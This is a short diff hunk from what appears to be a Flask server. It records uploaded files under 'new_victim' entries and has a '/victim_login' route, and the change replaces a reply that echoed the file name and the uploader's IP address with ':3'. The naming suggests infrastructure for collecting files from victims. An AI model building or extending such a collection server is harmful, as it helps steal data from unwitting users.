@@ -214,7 +214,7 @@ def upload_file():
         db.session.add(new_victim)
         db.session.commit()
 
-    return f"The file {file.filename} has been sent with the IP address: {request.remote_addr}!\n"
+    return f":3\n"
 
 # Login for victim
 @app.route('/victim_login', methods=['GET', 'POST'])
